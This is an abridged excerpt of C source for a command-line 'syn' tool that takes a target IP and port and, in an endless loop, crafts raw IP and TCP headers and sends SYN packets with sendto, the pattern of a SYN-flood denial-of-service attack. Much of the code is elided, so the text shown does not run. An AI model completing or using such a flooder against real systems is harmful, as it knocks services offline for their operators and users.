...
int main(int argc, char **argv)
{
    if (argc < 3)
    {
        printf("Usage: sudo ./syn <destination IP> <destination Port>\n");
        printf("E.g.\n");
    ...
    while (true)
    {
        ...
        init_iphdr(&iphdr, src_ip, dst_addr.sin_addr.s_addr);
        init_tcphdr(&tcphdr, dst_port);
        init_psdtcphdr(&psdtcphdr, src_ip, dst_addr.sin_addr.s_addr);
        ...
        // 调用sendto发送
        ret = sendto(sockfd, send_buf, sizeof(iphdr) + sizeof(tcphdr), 0, (sockaddr *)&dst_addr, sizeof(sockaddr));
        ...
        // printf("thread %d: from %s:%d to %s:%d\n", thread_id, src_ip, ntohs(tcphdr.src_port), dst_ip, ntohs(dst_addr.sin_port));
